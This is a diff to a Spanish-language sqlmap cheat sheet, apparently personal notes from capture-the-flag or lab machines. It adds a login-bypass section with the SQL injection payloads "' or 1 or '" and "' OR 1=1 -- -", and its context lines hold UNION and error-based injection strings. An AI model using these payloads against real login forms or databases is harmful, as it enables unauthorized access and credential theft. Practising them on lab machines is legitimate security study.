@@ -1,6 +1,6 @@
 # Inyección SQL con sqlmap
 
-Comandos usados en las máquinas **Vaucher**, **BOLA** y **boda**.
+Comandos usados en las máquinas **Vaucher**, **BOLA**, **boda** y **Monitor silencioso**.
 
 ## 1. Base de datos
 
@@ -60,7 +60,24 @@ El token se obtiene normalmente atacando el JWT (firma HS256 con clave pública)
 - Unión: `1' UNION SELECT null,null -- -`
 - Error: `1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- -`
 
-## 5. Resultados habituales
+## 5. Bypass de login (SQLi manual en el formulario)
+
+Si el login construye la consulta con concatenación, basta con romper la condición en el campo `username` (con cualquier password):
+
+```
+' or 1 or '
+```
+
+o, equivalentemente:
+
+```
+' OR 1=1 -- -
+```
+
+- En **Monitor silencioso** la respuesta correcta fue `HTTP/1.0 302 FOUND` con `Location: /internal/dashboard` y cookie de sesión nueva.
+- Si funciona desde el navegador, se puede automatizar con hydra (ver `Fuerza bruta y crackeo.md`, sección 2) o dejarlo a sqlmap con `--forms`.
+
+## 6. Resultados habituales
 
 El volcado suele traer usuarios con contraseña en claro y su hash (por ejemplo bcrypt `$2y$10$...`), lo que permite reutilizar las credenciales en SSH, FTP o el propio login web:
 
